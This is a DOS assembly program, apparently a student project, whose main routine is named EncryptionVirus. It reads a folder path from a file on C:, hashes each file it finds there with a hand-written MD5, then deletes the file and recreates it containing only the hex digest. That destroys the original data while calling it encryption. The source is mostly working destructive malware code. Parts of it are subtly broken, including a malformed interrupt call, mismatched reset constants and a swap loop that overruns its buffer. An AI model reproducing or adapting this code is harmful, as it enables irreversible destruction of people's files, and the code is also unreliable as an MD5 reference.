Include irvine16.inc

FileControlBlock struc 								;File Data
db 22 dup(?) 										;header info 
FileTime dw ? 										;time stamp of file
FileDate dw ? 										;date stamp of file
FileSize dd ? 										;size of file
FileName db 64 dup(0) 								;name of file found by DOS
FileControlBlock ends

.DATA
SubFolderFilePath db "C:\SFolder.txt",0				;Path to file contain sub-folder path get from c#
FolderPath Byte 260 DUP(0),0 						;Path of search folder
DTA FileControlBlock <>								;Point the file data struct to user-defined DTA
FileHandle dw ?					
BufferSize = 64										;To read 512-bit per time (64 byte)
FileFullPath db 260 DUP(0),0						;File full path after adding name found by DOS to it
Buffer db BufferSize DUP(0),0						;Buffer to read data from file to it
CurrentSize dw 0									;Indicator to file size to be used in padding (step in MD5)
TotalSize DWord 0									;To count how many characters remaon
RotationIndex Byte 0								;Index to Rotation array to indicate number of rotations per round
TIndex DWord 0										;Index to T array to use per round
K DWord 0

A DWord 67452301h
B DWord 0EFCDAB89h
E DWord 98BADCFEh
D DWord 10325476h

TempA DWord 0
TempB DWord 0
TempE DWord 0
TempD DWord 0

T DWord 0D76AA478h,0E8C7B756h,242070DBh,0C1BDCEEEh,0F57C0FAFh,4787C62Ah,0A8304613h,0FD469501h,698098D8h,8B44F7AFh,0FFFF5BB1h,895CD7BEh,6B901122h,0FD987193h,0A679438Eh,49B40821h
  DWord 0F61E2562h,0C040B340h,265E5A51h,0E9B6C7AAh,0D62F105Dh,02441453h,0D8A1E681h,0E7D3FBC8h,21E1CDE6h,0C33707D6h,0F4D50D87h,455A14EDh,0A9E3E905h,0FCEFA3F8h,676F02D9h,8D2A4C8Ah
  DWord 0FFFA3942h,8771F681h,6D9D6122h,0FDE5380Ch,0A4BEEA44h,4BDECFA9h,0F6BB4B60h,0BEBFBC70h,289B7EC6h,0EAA127FAh,0D4EF3085h,04881D05h,0D9D4D039h,0E6DB99E5h,1FA27CF8h,0C4AC5665h
  DWord 0F4292244h,432AFF97h,0AB9423A7h,0FC93A039h,655B59C3h,8F0CCC92h,0FFEFF47Dh,85845DD1h,6FA87E4Fh,0FE2CE6E0h,0A3014314h,4E0811A1h,0F7537E82h,0BD3AF235h,2AD7D2BBh,0EB86D391h

Rotation Byte 7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22
		 Byte 5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20
		 Byte 4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23
		 Byte 6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
			  
HashedData DWord 4 DUP(?)
HexaValues Byte '0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'

DataToBeWritten Byte 32 DUP(0),0
			  
.CODE

;----------------------------------------------------------------------------
;Get first file with specific extension from the given folder
;Recieves: SI contain offset of the path to search in
;Returns Data of first file found
;----------------------------------------------------------------------------
FindFirstFile PROC
mov AH,1Ah						;Set DTA
mov DX,offset DTA				;point DX to DTA returned by OS
int 21h

mov AH , 4Eh					;Dos function search for 1st matching file
mov CX , 1						;Normal attribute
mov DX , SI
int 21h  
JC Quit                             ; call Dos

RET
FindFirstFile ENDP

;----------------------------------------------------------------------------
;Get next file with specific extension from the given folder
;Recieve Nothing
;Returns Data of current file found
;----------------------------------------------------------------------------
FindNextFile PROC
mov AH, 4Fh
int 21h
JC Quit
RET
FindNextFile ENDP

;----------------------------------------------------------------------------
;append file name to the folder path
;Recieve: SI contain offset of folder path
;		: DI contain offset that will contain file full path
;Returns FileFullPath contains the full path of file including file name
;----------------------------------------------------------------------------
GetFilePath PROC USES ECX
INC DI
mov DX,DI

CopyPath:					;Copy folder path into FileFullPath var
CMP Byte Ptr [SI],'*'
JE Break
mov AL,[SI]
mov [DI],AL
INC SI
INC DI
JMP CopyPath

Break:
mov SI,offset DTA.FileName

AppendFileName:						;Append file name to file full path
cmp Byte Ptr [SI],0
je Break1
mov AL,[SI]
mov [DI],AL
INC SI
INC DI
JMP AppendFileName
Break1:
RET
GetFilePath ENDP

;----------------------------------------------------------------------------
;Open current found file
;Recieve: DX contain offset of file path
;Returns Nothing
;----------------------------------------------------------------------------
OpenFile PROC USES EAX
inc DX
mov AH,3Dh			;Open file
mov AL,2			;Choose the input mode(2 to read&write)
int 21h
JC Quit
mov FileHandle,AX
RET
OpenFile ENDP

;----------------------------------------------------------------------------
;Read current opened file
;Recieve: Nothing
;Returns AX conatains number of bytes retrieved from the file 
;----------------------------------------------------------------------------
ReadFile PROC USES ECX EDX
mov AH,3Fh				;Read from file
mov CX,  BufferSize		;Number of bytes to read 
mov DX,offset Buffer                                              
int 21h  
JC Quit

RET
ReadFile ENDP

;----------------------------------------------------------------------------
;Write file data after hashing in the same file
;Recieve: SI contain offset of array contains final A,B,C,D
;		: DX contain offset of the file full path
;Returns Nothing
;----------------------------------------------------------------------------
WriteEncryptedData PROC USES EAX ECX EBX EDI
mov AH , 3Eh									;Close file
int 21h

mov AH,41h 										;Delete file 
int 21

mov AH , 3Ch									;Create File
mov CX , 0										;Normal attribute
int 21h
JC Quit
mov DI,offset DataToBeWritten

PUSH EAX
mov EAX,[SI]									;Write A
PUSH ECX
mov ECX,8
WriteA:
mov EBX,0
mov EBX,EAX
AND EBX,0000000Fh
SHR EAX,4
PUSH EDX
mov DL,HexaValues[EBX]
mov [DI],DL
INC DI
POP EDX
LOOP WriteA

ADD SI,TYPE HashedData
POP ECX
POP EAX

PUSH EAX
mov EAX,[SI]									;Write B
PUSH ECX
mov ECX,8
WriteB:
mov EBX,0
mov EBX,EAX
AND EBX,0000000Fh
SHR EAX,4
PUSH EDX
mov DL,HexaValues[EBX]
mov [DI],DL
INC DI
POP EDX
LOOP WriteB
ADD SI,TYPE HashedData 
POP ECX
POP EAX

PUSH EAX
mov EAX,[SI]									;Write E
PUSH ECX
mov ECX,8
WriteE:
mov EBX,0
mov EBX,EAX
AND EBX,0000000Fh
SHR EAX,4
PUSH EDX
mov DL,HexaValues[EBX]
mov [DI],DL
INC DI
POP EDX
LOOP WriteE
ADD SI,TYPE HashedData
POP ECX
POP EAX

PUSH EAX
mov EAX,[SI]									;Write D
PUSH ECX
mov ECX,8
WriteD:
mov EBX,0
mov EBX,EAX
AND EBX,0000000Fh
SHR EAX,4
PUSH EDX
mov DL,HexaValues[EBX]
mov [DI],DL
INC DI
POP EDX
LOOP WriteD
ADD SI,TYPE HashedData
POP ECX
POP EAX

mov SI,offset DataToBeWritten
mov DI,offset DataToBeWritten
inc DI

mov ECX,64
Swap:
mov AL,[SI]
mov DL,[DI]
mov [DI],AL
mov [SI],DL
ADD SI,2
ADD DI,2
LOOP Swap
mov DX, offset DataToBeWritten
mov AH , 40h									;Write data to file
mov CX , LENGTHOF DataToBeWritten				;To write 128-bit returned from Md5 (128 byte actually written due to heaxa conversion)
dec cx
mov BX , FileHandle
int 21h
JC Quit
mov AH , 3Eh			;Close File
int 21h
RET
WriteEncryptedData ENDP

;-------------------------------------------------------------------------------------------------------
;The First Funnction of MD5 Encryption (F(TempB,TempE,TempD)=(TempB AND TempE) OR (NOT TempB AND TempD)
;Recieves: Values of TempB,TempE,TempD
;Returns EBX Contains the value returned form the equation
;-------------------------------------------------------------------------------------------------------
F PROC USES ECX
mov EBX,TempB
AND EBX,TempE	;EBX=(TempB AND TempE)
mov ECX,TempB
NOT ECX
AND ECX,TempD	;ECX=(NOT TempB AND TempD)
OR EBX,ECX
RET
F ENDP

;-------------------------------------------------------------------------------------------------------
;The Second Funnction of MD5 Encryption (G(TempB,TempE,TempD)=(TempB AND TempD) OR (TempE AND NOT TempD)
;Recieves: Values of TempB,TempE,TempD
;Returns EDX Contains the value returned form the equation
;-------------------------------------------------------------------------------------------------------
G PROC USES EBX
mov EBX,TempB
AND EBX,TempD	;EBX= (TempB AND TempD)
mov EDX,TempD
NOT EDX
AND EDX,TempE	;EDX=(TempE AND NOT TempD)
OR EDX,EBX
RET
G ENDP

;--------------------------------------------------------------------------------------
;The Third Funnction of MD5 Encryption (H(TempB,TempE,TempD)=TempB XOR TempE XOR TempD
;Recieves: Values of TempB,TempE,TempD
;Returns EAX Contains the value returned form the equation
;--------------------------------------------------------------------------------------
H PROC
mov EAX,TempB
XOR EAX,TempE	;EDX=(TempB XOR TempE)
XOR EAX,TempD
RET
H ENDP

;-------------------------------------------------------------------------------------------
;The Fourth Funnction of MD5 Encryption (I(TempB,TempE,TempD)=TempE XOR (TempB OR NOT TempD)
;Recieves: Values of B,E,D
;Returns ECX Contains the value returned form the equation
;-------------------------------------------------------------------------------------------
I PROC USES EBX
mov ECX,TempE
mov EBX,TempD
NOT EBX
OR EBX,TempB	;EBX=(TemoB OR NOT TempD)
XOR ECX,EBX
RET
I ENDP

;----------------------------------------------------------------------------
;The Funnction of MD5 
;Recieves: EAX Contains result of one of the four encryption functions.
;		 : EBX Contains 32-bit block of data from current 512 bit block.
;		 : IterationIndex Conatins the index of the current round.
;Returns (Modify) the values of the four variables TempA,TempB,TempE,TempD
;----------------------------------------------------------------------------
MD5 PROC USES EDX ECX

ADD EAX,TempA							;EAX=(EAX ADD A)
ADD EAX,EBX								;EAX=(EAX ADD EBX)
PUSH ESI
mov ESI,TIndex
ADD EAX,T[ESI]							;EAX=(EAX ADD Table)
movzx ESI, RotationIndex
mov CL,Rotation[ESI]
ROL EAX,CL								;EAX=(EAX Rotated)

POP ESI

mov EDX,TempD
mov ECX,TempE
mov TempD,ECX
mov ECX,TempB
mov TempE,ECX
ADD TempB,EAX
mov TempA,EDx

RET
MD5 ENDP

;----------------------------------------------------------------------------
;The Funnction of MD5Controller 
;Recieves:Nothing
;Returns :Nothing
;----------------------------------------------------------------------------
MD5Controller PROC USES EAX EBX ECX EDX ESI EDI

PUSH EAX
mov EAX,A
mov TempA,EAX
mov EAX,B
mov TempB,EAX
mov EAX,E
mov TempE,EAX
mov EAX,D
mov TempD,EAX
POP EAX
mov EAX,tempD

mov Rotationindex,0
mov TIndex,0
mov K,0
mov ECX,16

FCall:
PUSH EAX
PUSH EBX
mov EAX,0
mov EBX,0
mov EBX,4
mov AX,WORD PTR K
MUL BX
mov SI,offset BUFFER
ADD SI,AX
POP EBX
POP EAX
Call F
mov EAX,EBX
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPE T
INC K
LOOP FCall


mov K,0
mov ECX,16
GCall:
mov EAX,K
mov EBX,5
MUL EBX
INC EAX
mov EDX,0
mov EBX,16
DIV EBX
mov EAX,EDX
mov EBX,4
MUL EBX
mov SI,offset BUFFER
ADD SI,AX
Call G
mov EAX,EDX
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPE T
INC K
LOOP GCall


mov K,0
mov ECX,16
HCall:
mov EAX,K
mov EBX,3
MUL EBX
ADD EAX,5
mov EDX,0
mov EBX,16
DIV EBX
mov EAX,EDX
mov EBX,4
MUL EBX
mov SI,offset BUFFER
ADD SI,AX
Call H
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPE T
INC K
LOOP HCall


mov K,0
mov ECX,16
ICall:
mov EAX,K
mov EBX,7
MUL EBX
mov EDX,0
mov EBX,16
DIV EBX
mov EAX,EDX
mov EBX,4
MUL EBX
mov SI,offset BUFFER
ADD SI,AX
PUSH ECX
Call I
mov EAX,ECX
POP ECX
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPE T
INC K
LOOP ICall	


PUSH EAX
mov EAX,TempA
ADD A,EAX
mov EAX,TempB
ADD B,EAX
mov EAX,TempE
ADD E,EAX
mov EAX,TempD
ADD D,EAX
POP EAX

RET
MD5Controller ENDP

;--------------------------------------------------------------------------
;Clear part of the buffer
;Recieves : CurrentSize containsnumber of last read bytes
;Returns  : Buffer contains 0s only
;--------------------------------------------------------------------------
ClearBuffer PROC USES ECX EDI EBX
mov ECX,0
mov CX,BufferSize
SUB CX,CurrentSize
CMP CX,0
JE Ext
mov BX,CurrentSize
mov DI,offset Buffer
ADD DI,BX
mov BX,0

Clear:
mov BL,0
mov [DI],BL
INC DI
LOOP Clear
Ext:
RET
ClearBuffer ENDP

;----------------------------------------------------------------------------------------------------------
;Padding Function (Last Step Of Md5)
;Append 1-bit=1 after data , 64-bit contain file size at the end of buffer and the rest between them is 0's
;Recieves : CurrentSize contains number of last read bytes
;Returns  : Buffer Padded
;----------------------------------------------------------------------------------------------------------
Padding PROC USES ESI EBX
Call ClearBuffer
mov SI,offset Buffer
ADD SI,CurrentSize
CMP CurrentSize,55
JBE OneBuffer

CMP CurrentSize,64
JB TwoBuffers

Call MD5Controller
mov CurrentSize,0
Call ClearBuffer
mov BL,80h
mov SI,offset Buffer
OR [SI],BL
JMP AppendSize

TwoBuffers:
mov BL,80h
OR [SI],BL
Call MD5Controller
mov CurrentSize,0
Call ClearBuffer
JMP AppendSize

OneBuffer:
mov BL,80h
OR [SI],BL
AppendSize:
mov SI,offset Buffer
ADD SI,56
mov EAX,DTA.FileSize
mov EBX,8
MUL EBX
mov [SI],EAX
Call MD5Controller

RET
Padding ENDP

;----------------------------------------------------------------------------
;Reset Data of all variables used
;Recieves : Nothing
;Returns  : Nothing
;---------------------------------------------------------------------------
ResetData PROC USES EAX

mov DI,offset FileFullPath
mov CX,LENGTHOF FileFullPath
mov EAX,0

Target:
mov [DI],AL
inc DI
LOOP Target
mov TotalSize,0
mov A,01234567h
mov B,89ABCDEFh
mov E,0FEDCBA98h
mov D,78543210h

RET
ResetData ENDP

;----------------------------------------------------------------------------------------------------------
;get the path of current sub folder C# part find 
;Recieves : Nothing
;Returns  : Modify in FolderPath by the new Path
;----------------------------------------------------------------------------------------------------------
GetSubFolder PROC USES EDX ECX ESI EDI EBX
BufferSize = 260
mov DX,offset SubFolderFilePath-1
Call OpenFile
mov BX,FileHandle
Call ReadFile
mov ECX,0
mov CX,AX
mov AH , 3Eh			;Close file
int 21h

mov SI,offset Buffer
mov DI, offset FolderPath

CopyFolderPath:
mov AL,[SI]
mov [DI],AL
INC SI
INC DI
LOOP CopyFolderPath

RET
GetSubFolder ENDP 

;----------------------------------------------------------------------------
;The Main Controller of the project to call all functions
;Recieves: Nothing
;Returns : Nothing
;----------------------------------------------------------------------------
EncryptionVirus PROC

Call GetSubFolder

BufferSize = 64
mov SI , offset FolderPath

Call FindFirstFile

EncryptFiles:
mov SI , offset FolderPath
mov DI ,offset FileFullPath
Call GetFilePath


mov DX,offset filefullpath

Call OpenFile

mov BX,FileHandle  
ReadData:
mov EAX,0
Call ReadFile   
mov DX,offset Buffer    
ADD TotalSize,EAX
mov CurrentSize , AX
mov EAX,TotalSize
CMP  EAX, DTA.FileSize
JE EndOfFile
Call MD5Controller                                                               
JMP ReadData
EndOfFile:

Call Padding

PUSH EAX
mov EAX,A
mov HashedData[0],EAX
mov EAX,B
mov HashedData[4],EAX
mov EAX,E
mov HashedData[8],EAX
mov EAX,D
mov HashedData[12],EAX
POP EAX

mov SI,offset HashedData
mov DX,offset FileFullPath
INC DX

Call WriteEncryptedData

mov AH , 3Eh			;Close file
int 21h

Call ResetData

Call FindNextFile

JMP EncryptFiles

RET
EncryptionVirus ENDP

main PROC
mov AX,@data		;Initialize Data segment
mov DS,AX
Call EncryptionVirus
Quit::
.EXIT 
main ENDP
END main